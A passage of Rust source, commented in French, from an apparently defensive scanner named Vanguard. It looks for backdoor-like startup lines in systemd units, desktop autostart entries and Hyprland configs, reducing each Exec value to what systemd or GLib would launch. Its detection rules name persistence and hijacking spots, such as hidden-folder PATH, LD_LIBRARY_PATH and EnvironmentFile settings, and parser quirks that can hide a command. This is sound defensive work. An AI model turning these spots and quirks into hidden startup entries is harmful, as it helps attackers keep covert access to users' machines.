        "BindPaths",
        "BindReadOnlyPaths",
        "MountImages",
    ];
    let (cle, valeur) = ligne.split_once('=')?;
    let cle = cle.trim_matches([' ', '\t']);
    if !CLES.contains(&cle) {
        return None;
    }
    let codes = Codes::de(true, r);
    let valeur = developper_codes(valeur.trim_matches([' ', '\t']), &codes).unwrap_or_else(|| valeur.to_string());
    let (session, lue) = (home(), codes.maison.clone());
    let maisons = [session.as_str(), lue.as_str()];
    let cache = |chemin: &str| {
        let programme = format!("{}/x", chemin.trim_end_matches('/'));
        // Sous le dossier personnel lu, lui seul compte (le plus précis) ; sinon celui de la session aussi.
        if programme.starts_with(&format!("{lue}/")) {
            return programme_cache(&programme, &lue).is_some();
        }
        maisons.iter().any(|m| programme_cache(&programme, m).is_some())
    };
    let dossier = tr!(
        "réglage d'unité qui fait chercher programmes ou bibliothèques dans un dossier caché ou temporaire (PATH, LD_LIBRARY_PATH, ExecSearchPath)",
        "unit setting that makes programs or libraries be looked up in a hidden or temporary folder (PATH, LD_LIBRARY_PATH, ExecSearchPath)"
    );
    let lu_ailleurs = tr!(
        "réglage d'unité qui fait lire ses variables, son dossier courant, son entrée ou sa racine dans un dossier caché ou temporaire (EnvironmentFile, WorkingDirectory, StandardInput, RootDirectory, BindPaths)",
        "unit setting that reads its variables, working folder, input or root from a hidden or temporary folder (EnvironmentFile, WorkingDirectory, StandardInput, RootDirectory, BindPaths)"
    );
    let variables = |mots: Vec<String>| {
        mots.iter().find_map(|mot| {
            let (nom, v) = mot.split_once('=')?;
            variable_suspecte(nom.trim(), v, &maisons).map(|raison| {
                if ["PATH", "LD_LIBRARY_PATH"].contains(&nom.trim()) {
                    dossier
                } else {
                    raison
                }
            })
        })
    };
    match cle {
        "ExecSearchPath" => valeur.split(':').any(cache).then_some(dossier),
        "EnvironmentFile" => {
            let fichier = valeur.trim_start_matches('-');
            if cache(fichier.rsplit_once('/').map_or("", |(d, _)| d)) {
                return Some(lu_ailleurs);
            }
            // Son contenu, lu comme systemd le lit (lignes recollées, guillemets ôtés : vérification 3, P5) : les
            // variables qu'il pose se jugent comme celles d'« Environment= ». Illisible ou trop gros : la liste
            // permise (`permise::directive`) le dit.
            let lues = permise::lire_variables(&r.sous(Path::new(fichier))).ok()?;
            variables(lues.into_iter().map(|(n, v)| format!("{n}={v}")).collect())
        }
        "WorkingDirectory" | "RootDirectory" => {
            cache(valeur.trim_start_matches(['-', '+', '!'])).then_some(lu_ailleurs)
        }
        "RootImage" => {
            cache(valeur.trim_start_matches('-').rsplit_once('/').map_or("", |(d, _)| d)).then_some(lu_ailleurs)
        }
        "StandardInput" | "StandardInputFile" => {
            let chemin = valeur.strip_prefix("file:").unwrap_or(&valeur);
            (chemin.starts_with('/') && cache(chemin.rsplit_once('/').map_or("", |(d, _)| d))).then_some(lu_ailleurs)
        }
        "BindPaths" | "BindReadOnlyPaths" | "MountImages" => valeur
            .split_whitespace()
            .filter_map(|m| m.trim_start_matches(['-', '+']).split(':').next())
            .any(|source| cache(source.rsplit_once('/').map_or("", |(d, _)| d)))
            .then_some(lu_ailleurs),
        _ => {
            let mots = commandes_de_systemd(&valeur).map_or_else(
                || valeur.split_whitespace().map(str::to_string).collect::<Vec<_>>(),
                |c| c.into_iter().flatten().collect(),
            );
            variables(mots)
        }
    }
}

/// Comment la commande d'une ligne se ramène à ce qui se lance (relecture adverse, cause racine : juger la forme
/// finale, pas le texte) : telle qu'écrite, comme systemd (ses codes « % », guillemets, échappements, « ; »), comme
/// un .desktop (décodé comme systemd-xdg-autostart-generator, `exec_de_bureau`, puis comme systemd), ou comme
/// Hyprland (ses variables remplacées).
enum Lecteur<'a> {
    /// Un texte qui ne se lance pas (touches, description d'un raccourci Lua) : ses seuls mots jugés.
    Texte,
    /// Une ligne de shell (`ligne_de_shell_suspecte`).
    Brut,
    Systemd(Codes),
    /// Une entrée de bureau, et son dossier courant (`dossier_de_bureau`).
    Bureau(Option<String>),
    Hypr(&'a std::collections::BTreeMap<String, Vec<String>>),
}

/// La raison d'une commande que Vanguard ne ramène pas à ce que systemd lance.
fn non_resolu_systemd() -> &'static str {
    tr!(
        "commande que Vanguard ne ramène pas à ce que systemd lance (code « % » de l'unité, échappement ou guillemet) : non vérifiée",
        "command Vanguard cannot reduce to what systemd starts (unit “%” specifier, escape or quote): not checked"
    )
}

/// La raison d'une valeur Exec de .desktop que Vanguard ne ramène pas aux mots que systemd lance (`exec_de_bureau`).
fn exec_de_bureau_non_lu() -> &'static str {
    tr!(
        "commande d'entrée de bureau que Vanguard ne ramène pas à ce que systemd lance (échappement, guillemet ou caractère que le générateur refuse ou lit autrement) : non vérifiée",
        "desktop entry command Vanguard cannot reduce to what systemd starts (escape, quote or character the generator rejects or reads differently): not checked"
    )
}

/// Une valeur Exec de .desktop ramenée aux mots que systemd-xdg-autostart-generator (systemd 262, mesuré) confie à
/// systemd, réécrite pour `commandes_de_systemd` (revérification 8, C-1). Trois niveaux, comme lui : la lecture du
/// fichier (`\s`, `\n`, `\t`, `\r`, `\\`, `\;` ; tout autre échappement fait refuser le fichier) ; le découpage
/// en mots (guillemets ôtés, un « \ » protège le caractère suivant, même entre guillemets ; un guillemet non fermé
/// finit le mot) ; puis chaque mot décodé comme en C (`cunescape`), un mot entier « %f », « %U »… ôté (pas le
/// premier), « %% » réduit à « % », « ~ » ou « ~/… » en tête remplacé par la `maison`. `None` : ce que le générateur
/// refuse ou que Vanguard ne réécrit pas sûrement (octet nul, UTF-8 invalide, programme à préfixe « -@:+!| »).
fn exec_de_bureau(valeur: &str, maison: &str) -> Option<String> {
    // Niveau 1 : la valeur telle que le fichier la donne. Un « \ » seul à la fin est celui d'une ligne continuée.
    let mut lue = String::with_capacity(valeur.len());
    let mut lettres = valeur.chars();
    while let Some(c) = lettres.next() {
        if c != '\\' {
            lue.push(c);
            continue;
        }
        match lettres.next() {
            None => {}
            Some('s') => lue.push(' '),
            Some('n') => lue.push('\n'),
            Some('t') => lue.push('\t'),
            Some('r') => lue.push('\r'),
            Some(e @ ('\\' | ';')) => lue.push(e),
            Some(_) => return None,
        }
    }
    let mut sortie: Vec<String> = Vec::new();
    for (rang, mot) in mots_de_bureau(&lue).into_iter().enumerate() {
        let mot = cunescape(&mot)?;
        if rang == 0 {
            if mot.is_empty() || mot.starts_with(['-', '@', ':', '+', '!', '|']) {
                return None;
            }
            sortie.push(mot);
            continue;
        }
        let mut code = mot.chars();
        if code.next() == Some('%') && code.next().is_some_and(|l| "fFuUdDnNickvm".contains(l)) && code.next().is_none()
        {
            continue;
        }
        let mot = mot.replace("%%", "%");
        let mot = match mot.strip_prefix('~') {
            Some(reste) if reste.is_empty() || reste.starts_with('/') => format!("{maison}{reste}"),
            _ => mot,
        };
        sortie.push(mot);
    }
    Some(sortie.iter().map(|m| mot_pour_systemd(m)).collect::<Vec<_>>().join(" "))
}

/// Les mots d'une valeur Exec lue (niveau 2 d'`exec_de_bureau`), comme `extract_first_word` de systemd avec
/// EXTRACT_UNQUOTE et EXTRACT_RELAX : séparés par espace, tabulation, « \n » ou « \r » ; « ' » et « " » ouvrent et
/// ferment un passage sans séparateur ; un « \ » garde le caractère suivant tel quel (même entre guillemets), seul à
/// la fin il s'efface ; « "" » donne un mot vide.
fn mots_de_bureau(lue: &str) -> Vec<String> {
    let mut mots = Vec::new();
    let mut mot = String::new();
    let (mut dans_un_mot, mut guillemet) = (false, None::<char>);
    let mut lettres = lue.chars();
    while let Some(c) = lettres.next() {
        match (guillemet, c) {
            (_, '\\') => {
                dans_un_mot = true;
                if let Some(e) = lettres.next() {
                    mot.push(e);
                }
            }
            (Some(q), c) if c == q => guillemet = None,
            (Some(_), c) => mot.push(c),
            (None, '\'' | '"') => {
                dans_un_mot = true;
                guillemet = Some(c);
            }
            (None, ' ' | '\t' | '\n' | '\r') => {
                if dans_un_mot {
                    mots.push(std::mem::take(&mut mot));
                    dans_un_mot = false;
                }
            }
            (None, c) => {
                dans_un_mot = true;
                mot.push(c);
            }
        }
    }
    if dans_un_mot {
        mots.push(mot);
    }
    mots
}

/// Un mot décodé comme `cunescape` de systemd sans drapeau : « \a \b \f \n \r \t \v \\ \" \' \s », « \xNN » et
/// « \NNN » (octal) donnent un octet, « \uXXXX » et « \UXXXXXXXX » un caractère. `None` : échappement inconnu ou
/// incomplet, nul, octal au-delà de 255, caractère invalide, ou octets qui ne font pas de l'UTF-8.
fn cunescape(mot: &str) -> Option<String> {
    let mut octets: Vec<u8> = Vec::with_capacity(mot.len());
    let mut lettres = mot.chars();
    let chiffres = |lettres: &mut std::str::Chars<'_>, n: usize, base: u32| -> Option<u32> {
        let mut v = 0_u32;
        for _ in 0..n {
            v = v.checked_mul(base)?.checked_add(lettres.next()?.to_digit(base)?)?;
        }
        Some(v)
    };
    let mut tampon = [0_u8; 4];
    while let Some(c) = lettres.next() {
        if c != '\\' {
            octets.extend_from_slice(c.encode_utf8(&mut tampon).as_bytes());
            continue;
        }
        let e = lettres.next()?;
        let octet = match e {
            'a' => 7,
            'b' => 8,
            'f' => 12,
            'n' => b'\n',
            'r' => b'\r',
            't' => b'\t',
            'v' => 11,
            's' => b' ',
            '\\' | '"' | '\'' => u8::try_from(e).ok()?,
            'x' => u8::try_from(chiffres(&mut lettres, 2, 16)?).ok()?,
            '0'..='7' => {
                let reste = chiffres(&mut lettres, 2, 8)?;
                u8::try_from(e.to_digit(8)?.checked_mul(64)?.checked_add(reste)?).ok()?
            }
            'u' | 'U' => {
                let lettre = char::from_u32(chiffres(&mut lettres, if e == 'u' { 4 } else { 8 }, 16)?)?;
                if lettre == '\0' {
                    return None;
                }
                octets.extend_from_slice(lettre.encode_utf8(&mut tampon).as_bytes());
                continue;
            }
            _ => return None,
        };
        if octet == 0 {
            return None;
        }
        octets.push(octet);
    }
    String::from_utf8(octets).ok()
}

/// Un mot écrit pour que `commandes_de_systemd` le relise tel quel : nu s'il n'a ni blanc, ni guillemet, ni « \ »,
/// ni « ; », ni caractère de contrôle ; sinon entre guillemets, « \ » et « " » échappés, un contrôle en « \xNN »
/// (ASCII) ou « \u00NN » (U+0080 à U+009F : un « \xNN » y serait un octet seul, pas de l'UTF-8).
fn mot_pour_systemd(mot: &str) -> String {
    let a_proteger = |c: char| c.is_ascii_whitespace() || c.is_control() || matches!(c, '"' | '\'' | '\\' | ';');
    if !mot.is_empty() && !mot.contains(a_proteger) {
        return mot.to_string();
    }
    let mut ecrit = String::from("\"");
    for c in mot.chars() {
        match c {
            '\\' | '"' => {
                ecrit.push('\\');
                ecrit.push(c);
            }
            c if c.is_control() => {
                // Un contrôle vaut au plus U+009F : deux chiffres hexadécimaux.
                let v = u32::from(c);
                ecrit.push_str(if c.is_ascii() { "\\x" } else { "\\u00" });
                ecrit.extend([v >> 4, v & 0xf].iter().filter_map(|&d| char::from_digit(d, 16)));
            }
            c => ecrit.push(c),
        }
    }
    ecrit.push('"');
    ecrit
}

/// La raison d'une valeur Exec de .desktop que Vanguard ne ramène pas à ce que lance GLib (`formes_de_glib`).
fn exec_de_glib_non_lu() -> &'static str {
    tr!(
        "commande d'entrée de bureau que Vanguard ne ramène pas à ce que lance GLib (gio, gnome-session : trop de noms ou d'icônes à essayer, chemin du fichier ou code « % » qui ne fait pas de l'UTF-8) : non vérifiée",
        "desktop entry command Vanguard cannot reduce to what GLib starts (gio, gnome-session: too many names or icons to try, file path or “%” code that is not UTF-8): not checked"
    )
}

/// Une valeur lue comme GKeyFile (GLib) la rend : « \s », « \n », « \t », « \r », « \\ » ; tout autre échappement,
/// ou un « \ » final, fait refuser la valeur (mesuré avec gio launch : l'entrée ne se lance pas). `None` : refusée.
fn valeur_de_glib(valeur: &str) -> Option<String> {
    let mut lue = String::with_capacity(valeur.len());
    let mut lettres = valeur.chars();
    while let Some(c) = lettres.next() {
        if c != '\\' {
            lue.push(c);
            continue;
        }
        lue.push(match lettres.next()? {
            's' => ' ',
            'n' => '\n',
            't' => '\t',
            'r' => '\r',
            '\\' => '\\',
            _ => return None,
        });
    }
    Some(lue)
}

/// Un texte cité comme `g_shell_quote` de GLib : entre « ' », chaque « ' » écrit « '\'' ».
fn cite_par_glib(texte: &str) -> String {
    let mut cite = String::from("'");
    cite.push_str(&texte.replace('\'', r"'\''"));
    cite.push('\'');
    cite
}

/// Les mots d'une ligne comme `g_shell_parse_argv` de GLib : découpe sur espace, tabulation et « \n » hors guillemets
/// (pas « \r ») ; « # » au début de la ligne ou après une espace ou un « \n » ouvre un commentaire jusqu'au « \n » ;
/// puis chaque mot sans ses guillemets : hors guillemets « \ » garde le caractère suivant (« \ » + « \n » s'efface) ;
/// entre « ' » tout est littéral ; entre « " », « \ » n'échappe que « " », « \ », « ` », « $ » et « \n ». `None` :
/// guillemet non fermé, « \ » final ou ligne vide (GLib ne lance rien).
fn mots_de_glib(ligne: &str) -> Option<Vec<String>> {
    let mut jetons: Vec<String> = Vec::new();
    let mut jeton: Option<String> = None;
    let mut ouvert: Option<char> = None;
    let (mut echappe, mut precedent) = (false, None::<char>);
    for c in ligne.chars() {
        match ouvert {
            Some('\\') => {
                if c != '\n' {
                    let j = jeton.get_or_insert_with(String::new);
                    j.push('\\');
                    j.push(c);
                }
                ouvert = None;
            }
            Some('#') => {
                if c == '\n' {
                    ouvert = None;
                }
            }
            Some(q) => {
                if c == q && !(q == '"' && echappe) {
                    ouvert = None;
                }
                jeton.get_or_insert_with(String::new).push(c);
            }
            None => match c {
                '\n' => jetons.extend(jeton.take()),
                ' ' | '\t' => jetons.extend(jeton.take().filter(|j| !j.is_empty())),
                '\'' | '"' => {
                    jeton.get_or_insert_with(String::new).push(c);
                    ouvert = Some(c);
                }
                '\\' => ouvert = Some('\\'),
                '#' if matches!(precedent, None | Some(' ' | '\n')) => ouvert = Some('#'),
                c => jeton.get_or_insert_with(String::new).push(c),
            },
        }
        echappe = c == '\\' && !echappe;
        precedent = Some(c);
    }
    jetons.extend(jeton);
    if matches!(ouvert, Some('\\' | '\'' | '"')) || jetons.is_empty() {
        return None;
    }
    let mut mots = Vec::with_capacity(jetons.len());
    for j in jetons {
        let mut mot = String::with_capacity(j.len());
        let mut lettres = j.chars().peekable();
        while let Some(c) = lettres.next() {
            match c {
                '\\' => {
                    if let Some(e) = lettres.next().filter(|e| *e != '\n') {
                        mot.push(e);
                    }
                }
                '\'' => loop {
                    match lettres.next()? {
                        '\'' => break,
                        x => mot.push(x),
                    }
                },
                '"' => loop {
                    match lettres.next()? {
                        '"' => break,
                        '\\' => match lettres.peek() {
                            Some(&e @ ('"' | '\\' | '`' | '$' | '\n')) => {
                                mot.push(e);
                                lettres.next();
                            }
                            _ => mot.push('\\'),
                        },
                        x => mot.push(x),
                    }
                },
                c => mot.push(c),
            }
        }
        mots.push(mot);
    }
    Some(mots)
}

/// Les commandes qu'une valeur Exec de .desktop donne à GLib (gio launch, gnome-session ; revérification 9, D-2 ;
/// mesuré avec gio launch), réécrites pour `commandes_de_systemd` : la valeur lue comme GKeyFile (`valeur_de_glib`),
/// puis chaque « %x » remplacé partout, même au milieu d'un mot (expand_application_parameters) : « %c » par le nom
/// cité (ou par rien sans nom lisible), « %k » par le chemin du `fichier` cité, « %i » par « --icon » et l'icône
/// citée, « %% » par « % », tout autre code (« %f », « %U »… : aucun fichier au démarrage) par rien ; puis les mots
/// de `mots_de_glib`. Le nom et l'icône dépendent de la langue de la session : une commande par nom (`noms`, plus
/// l'absence de nom si `sans_nom` ; revérification 10, E-1) et par icône (`icones`, ou aucune) possibles.
/// `Ok(vide)` : GLib ne la lance pas ; `Err` : trop de cas à essayer, `fichier` absent (pas de l'UTF-8) pour « %k »,
/// ou un code « % » collé à un caractère non ASCII (GLib coupe ses octets).
fn exec_de_glib(
    valeur: &str,
    noms: &[String],
    sans_nom: bool,
    icones: &[String],
    fichier: Option<&str>,
) -> Result<Vec<String>, ()> {
    const CAS_MAX: usize = 32;
    let Some(lue) = valeur_de_glib(valeur) else {
        return Ok(Vec::new());
    };
    let mut codes = Vec::new();
    let mut lettres = lue.chars();
    while let Some(c) = lettres.next() {
        if c == '%' {
            codes.extend(lettres.next());
        }
    }
    let a_code = |l: char| codes.contains(&l);
    let noms: Vec<Option<&str>> = if a_code('c') {
        let mut essais: Vec<Option<&str>> = noms.iter().map(|n| Some(n.as_str())).collect();
        if sans_nom {
            essais.push(None);
        }
        essais
    } else {
        vec![None]
    };
    let mut toutes: Vec<Option<&str>> = vec![None];
    if a_code('i') {
        toutes.extend(icones.iter().map(|i| Some(i.as_str())));
    }
    if noms.len().saturating_mul(toutes.len()) > CAS_MAX || (a_code('k') && fichier.is_none()) {
        return Err(());
    }
    let mut formes: Vec<String> = Vec::new();
    for nom in &noms {
        for icone in &toutes {
            let mut ligne = String::with_capacity(lue.len());
            let mut lettres = lue.chars();
            while let Some(c) = lettres.next() {
                if c != '%' {
                    ligne.push(c);
                    continue;
                }
                let Some(code) = lettres.next() else {
                    ligne.push('%');
                    break;
                };
                if !code.is_ascii() {
                    return Err(());
                }
                match code {
                    'c' => {
                        if let Some(n) = nom {
                            ligne.push_str(&cite_par_glib(n));
                        }
                    }
                    'k' => ligne.push_str(&cite_par_glib(fichier.unwrap_or_default())),
                    'i' => {
                        if let Some(i) = icone {
                            ligne.push_str("--icon ");
                            ligne.push_str(&cite_par_glib(i));
                        }
                    }
                    '%' => ligne.push('%'),
                    _ => {}
                }
            }
            let Some(mots) = mots_de_glib(&ligne) else { continue };
            let forme = mots.iter().map(|m| mot_pour_systemd(m)).collect::<Vec<_>>().join(" ");
            if !formes.contains(&forme) {
                formes.push(forme);
            }
        }
    }
    Ok(formes)
}

/// `exec_de_glib` pour la `commande` d'une entrée de bureau lue `texte` au chemin `f` : les noms (« Name= » et ses
/// traductions, lus comme GKeyFile) et les icônes de [Desktop Entry]. GLib prend le Name[..] lisible de la langue,
/// sinon le dernier « Name= » non traduit, sinon aucun nom (mesuré avec gio launch : « Unnamed » n'est qu'affiché,
/// jamais lancé). L'absence de nom est essayée quand un « Name= » non traduit manque ou ne se lit pas (échappement
/// refusé, octet qui n'est pas de l'UTF-8, lu ici « � ») : revérification 10, E-1.
fn formes_de_glib(commande: &str, texte: &str, f: &Path) -> Result<Vec<String>, ()> {
    let (mut noms, mut icones) = (Vec::new(), Vec::new());
    let (mut nom_lisible, mut nom_illisible) = (false, false);
    for c in cles_de_bureau(texte) {
        let (cle, traduite) = c
            .cle
            .split_once('[')
            .map_or((c.cle.as_str(), false), |(k, _)| (k, true));
        let lue = valeur_de_glib(&c.valeur);
        if cle == "Name" && !traduite {
            match &lue {
                Some(v) if !v.contains('\u{FFFD}') => nom_lisible = true,
                _ => nom_illisible = true,
            }
        }
        let liste = match cle {
            "Name" => &mut noms,
            "Icon" => &mut icones,
            _ => continue,
        };
        if let Some(v) = lue
            && !liste.contains(&v)
        {
            liste.push(v);
        }
    }
    exec_de_glib(commande, &noms, !nom_lisible || nom_illisible, &icones, f.to_str())
}

/// Juge la `commande` lancée par la `ligne` (numéro `n`, à partir de 0) du fichier `f` lu `lu` : levée si elle
/// ressemble à une porte dérobée, telle qu'écrite ou une fois ramenée à sa forme finale par son `lecteur` ; une
/// forme finale que Vanguard ne sait pas calculer (variable de Hyprland sans valeur, code de l'unité) est levée aussi,
/// jamais tue. `retirable` : la ligne est écrite telle quelle dans le fichier (sinon, jointe ou lue par morceaux,
/// aucun retrait n'est proposé). Vrai si la ligne est levée.
#[allow(clippy::too_many_arguments)]
fn juger_lancement(
    t: &mut Lancements,
    f: &Path,
    lu: &Lecture,
    n: usize,
    ligne: &str,
    commande: &str,
    ambigue: bool,
    sorte: Sorte,
    retirable: bool,
    lecteur: &Lecteur<'_>,
) -> bool {
    let lue = t.r.maison.to_string_lossy().into_owned();
    let session = home();
    let maisons = [session.as_str(), lue.as_str()];
    let racine_seul = de_root_seul(f);
    // Une ligne géante ne se découpe pas (vérification 3, S15 : des minutes) : dite, jamais tue.
    if !racine_seul && commande.len() > permise::LIGNE_MAX {
        let raison = permise::Ecart::Longue.raison();
        lever(t, f, lu, n, ligne, commande, true, sorte, retirable, raison);
        return true;
    }
    // Une forme finale qui ne se calcule pas, dans un fichier que seul root écrit, est celle de root (un paquet, un
    // administrateur) : dite seulement là où le compte écrit.
    let dite = |r: Result<Option<&'static str>, ()>| match r {
        Ok(raison) => raison,
        Err(()) if de_root_seul(f) => None,
        Err(()) => Some(non_resolu_systemd()),
    };
    let tout_argument = !de_root_seul(f);
    // C-1 (revérification 8) : une valeur Exec de .desktop se juge sous les mots que systemd lance, décodés comme le
    // générateur (`exec_de_bureau`) ; ce qui ne s'y ramène pas est dit non vérifié là où le compte écrit, jamais tu.
    let decodee = match lecteur {
        Lecteur::Bureau(_) => match exec_de_bureau(commande, &lue) {
            Some(c) => Some(c),
            None if racine_seul => None,
            None => {
                let raison = exec_de_bureau_non_lu();
                lever(t, f, lu, n, ligne, commande, true, sorte, retirable, raison);
                return true;
            }
        },
        _ => None,
    };
    let jugee = decodee.as_deref().unwrap_or(commande);
    // D-2 (revérification 9) : la même valeur lue par GLib (gio, gnome-session), qui retire un code « % » même au
    // milieu d'un mot et met le nom, l'icône ou le chemin à la place de « %c », « %i », « %k ». Chaque lecture se
    // juge ; l'une qui touche un lieu de démarrage suffit.
    let glib = match lecteur {
        Lecteur::Bureau(_) => match formes_de_glib(commande, &lu.texte, f) {
            Ok(formes) => formes,
            Err(()) if racine_seul => Vec::new(),
            Err(()) => {
                let raison = exec_de_glib_non_lu();
                lever(t, f, lu, n, ligne, commande, true, sorte, retirable, raison);
                return true;
            }
        },
        _ => Vec::new(),
    };
    let mut jugees = vec![jugee];
    for g in &glib {
        if !jugees.contains(&g.as_str()) {
            jugees.push(g);
        }
    }
    // Une ligne de shell qui ne se lit pas : dite comme telle, là où le compte écrit.
    let shell = |c: &str| match ligne_de_shell_suspecte(c, &maisons, tout_argument) {
        Ok(raison) => raison,
        Err(()) if de_root_seul(f) => None,
        Err(()) => Some(shell_non_lu()),
    };
    let raison = commande_suspecte_chez(commande, true, &maisons).or_else(|| match lecteur {
        Lecteur::Texte => None,
        Lecteur::Brut => shell(commande),
        Lecteur::Systemd(codes) => dite(forme_finale_de_systemd(commande, Some(codes), &maisons, tout_argument)),
        Lecteur::Bureau(_) => jugees
            .iter()
            .find_map(|c| dite(forme_finale_de_systemd(c, None, &maisons, tout_argument))),
        Lecteur::Hypr(variables) => {
            if !commande.contains('$') {
                return shell(commande);
            }
            match resoudre_hypr(commande, variables) {
                Some(formes) => formes
                    .iter()
                    .find_map(|c| commande_suspecte_chez(c, true, &maisons).or_else(|| shell(c))),
                None => Some(variable_inconnue()),
            }
        }
    });
    // La liste permise (vérification 3) : là où le compte écrit, le silence n'est gardé que pour une ligne dont la
    // forme entière est reconnue sûre ; le découpage d'avant ne sert plus qu'à dire une raison plus précise.
    let mut notes = Vec::new();
    let (raison, hors_liste): (Option<std::borrow::Cow<'static, str>>, bool) = match raison {
        Some(r) => (Some(r.into()), false),
        None if racine_seul => (None, false),
        None => (
            jugees
                .iter()
                .find_map(|c| hors_de_la_liste(&t.r, c, lecteur, &maisons, &mut notes)),
            true,
        ),
    };
    let Some(raison) = raison else {
        let perso = t.r.maison.clone();
        for e in notes {
            t.informations.push(trf!(
                "{}:{} : {}",
                "{}:{}: {}",
                court(f, &perso),
                n.saturating_add(1),
                e.raison()
            ));
        }
        return false;
    };
    // Ce qui ne se lit pas sûrement ne se déclare pas normal : ce qu'un choix lierait ne dirait pas ce qui se lance.
    let ambigue =
        ambigue || hors_liste || [shell_non_lu(), non_resolu_systemd(), variable_inconnue()].contains(&&*raison);
    lever(t, f, lu, n, ligne, commande, ambigue, sorte, retirable, &raison);
    // La sauvegarde de Vanguard reconnue à sa forme exacte, mais levée pour ce qui la change (~/.popt, complément,
    // variables, programme du compte) : le refus dit cela et comment la remettre, pas « ligne ambiguë » (point 10).
    if matches!(lecteur, Lecteur::Systemd(c) if c.sauvegarde.is_some())
        && let Some(dernier) = t.temoins.last_mut()
    {
        let ou = crate::ui::affichable(&court(f, &t.r.maison));
        *dernier = Err(refus_de_la_sauvegarde(&ou, n.saturating_add(1), &raison));
    }
    true
}

/// Le refus d'une ligne de la sauvegarde de Vanguard, posée telle que Vanguard la pose mais levée pour la `raison`
/// dite (ce qui peut changer ce qu'elle lance) : jamais déclarable, puisque ce qui la change n'est pas dans la ligne
/// qu'un choix lierait. Dit ce qui a changé et comment la retrouver muette, sans faire retirer la sauvegarde : le
/// ~/.popt se juge en entier (une ligne retirée ne le tait pas), et la remettre en place ne change rien qu'à une
/// variable sur une sauvegarde d'avant la 0.95 (relecture 0.95, V-5).
fn refus_de_la_sauvegarde(ou: &str, numero: usize, raison: &str) -> temoins::Refus {
    temoins::Refus(trf!(
        "{ou}:{numero} : la sauvegarde de Vanguard ne peut pas être déclarée normale tant que quelque chose peut changer ce qu'elle lance ({raison}). Gardez la sauvegarde : retirez plutôt ce qui la change, soit le fichier ~/.popt en entier (en retirer une ligne ne suffit pas), le complément « .service.d » ou la ligne qui pose la variable. Si l'alerte vient d'une variable et que la sauvegarde a été posée avant la 0.95, l'annuler (« vanguard sauvegarde-auto --annuler ») puis la remettre (« vanguard sauvegarde-auto ») peut suffire : sa forme 0.95 lance rsync sans les variables du gestionnaire. Elle se tait de nouveau dès qu'elle a sa forme et que rien ne la change",
        "{ou}:{numero}: the Vanguard backup cannot be declared normal while something can change what it starts ({raison}). Keep the backup: remove what changes it instead, that is the whole ~/.popt file (removing one line is not enough), the “.service.d” drop-in or the line that sets the variable. If the alert comes from a variable and the backup was set up before 0.95, undoing it (“vanguard auto-backup --undo”) then setting it up again (“vanguard auto-backup”) may be enough: its 0.95 form starts rsync without the manager's variables. It goes quiet again as soon as it has its form and nothing changes it"
    ))
}

/// Pourquoi la `commande` d'une ligne que le compte écrit n'entre pas dans la liste permise (`permise`), lue par
/// son `lecteur` (celle d'une entrée de bureau déjà décodée par `exec_de_bureau`), ou `None` : le filet textuel
/// d'abord (un dossier temporaire ou caché nommé en toutes lettres), puis la forme entière. Un texte qui ne se lance
/// pas (`Lecteur::Texte`) n'y passe pas. Ce qui n'a pas été vu d'une ligne permise d'unité va dans `notes`
/// (`permise::exec_systemd_note`).
fn hors_de_la_liste(
    r: &Releveur,
    commande: &str,
    lecteur: &Lecteur<'_>,
    maisons: &[&str],
    notes: &mut Vec<permise::Ecart>,
) -> Option<std::borrow::Cow<'static, str>> {
    let lue = r.maison.to_string_lossy();
    let s = permise::Systeme {
        racine: &r.racine,
        maison: &lue,
        maisons,
        courant: match lecteur {
            Lecteur::Systemd(codes) => codes.courant.as_deref(),
            Lecteur::Bureau(courant) => courant.as_deref(),
            _ => None,
        },
        noms_des_lieux: std::cell::OnceCell::new(),
        relatif: std::cell::OnceCell::new(),
    };
    let ecart = match lecteur {
        Lecteur::Texte => return None,
        Lecteur::Systemd(codes) => permise::exec_systemd_note(&s, commande, Some(codes), notes),
        Lecteur::Bureau(_) => permise::exec_systemd(&s, commande, None),
        Lecteur::Hypr(variables) if commande.contains('$') => match resoudre_hypr(commande, variables) {
            Some(formes) => formes.iter().try_for_each(|c| permise::ligne_shell(&s, c)),
            None => return Some(variable_inconnue().into()),
        },
        Lecteur::Brut | Lecteur::Hypr(_) => permise::ligne_shell(&s, commande),
    };
    if permise::filet(commande, matches!(lecteur, Lecteur::Systemd(_)), maisons) {
        return Some(permise::Ecart::Filet.raison().into());
    }
    // B-2 (revérification 7) : un dossier de départ inconnu se dit avec sa clé et l'argument relatif.
    let cle = if matches!(lecteur, Lecteur::Bureau(_)) {
        "Path="
    } else {
        "WorkingDirectory="
    };
    ecart.err().map(|e| s.raison_dite(e, cle))
}

/// La raison d'une ligne de Hyprland dont une variable n'a pas de valeur connue.
fn variable_inconnue() -> &'static str {
    tr!(
        "variable de Hyprland ou du shell sans valeur connue : ce que la ligne lance ne se voit pas",
        "Hyprland or shell variable without a known value: what the line starts cannot be seen"
    )
}

/// Lève la `ligne` (numéro `n`, à partir de 0) du fichier `f` lu `lu`, qui lance `commande`, pour la `raison` dite :
/// sa source, son retrait s'il est `retirable`, son témoin (ce qu'un choix « normal » lierait, ou pourquoi on ne
/// peut pas), et la ligne de l'alerte.
#[allow(clippy::too_many_arguments)]
fn lever(
    t: &mut Lancements,
    f: &Path,
    lu: &Lecture,
    n: usize,
    ligne: &str,
    commande: &str,
    ambigue: bool,
    sorte: Sorte,
    retirable: bool,
    raison: &str,
) {
    t.sources
        .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), ligne));
    t.retraits
        .push(if retirable { retrait(f, &lu.texte, ligne) } else { None });
    let maison = maison_texte(t);
    let designe = if ambigue {
        Designe::Indefini(designes::Flou::Syntaxe)
    } else {
        designes::commande(commande, sorte.contexte(&maison))
    };
    let temoin = temoin_de_ligne(t, f, n, lu, ligne, designe, true, sorte);
    t.temoins.push(temoin);
    let perso = t.r.maison.clone();
    t.suspects.push(trf!(
        "{}:{} : {raison}",
        "{}:{}: {raison}",
        court(f, &perso),
        n.saturating_add(1)
    ));
}

/// Ce qu'une ligne d'un fichier .conf de Hyprland lance, au-delà de `commande_lancee_lue` : un raccourci (toute forme
/// « bind… = MODS, touche, exec, commande », « bindd » avec sa description en plus : chaque champ à partir du
/// troisième qui vaut « exec » ou « execr »), un geste (« gesture = 3, up, dispatcher, exec, commande »), un
/// lancement précédé de règles (« exec-once = [workspace 2 silent] commande », jusqu'au premier « ] » comme
/// Hyprland), un greffon chargé (« plugin = chemin.so ») ou une commande d'hypridle (« on-timeout = … »,
/// « lock_cmd = … »). Une clé dans une catégorie écrite sur la ligne (« x { exec-once = … } ») compte comme seule.
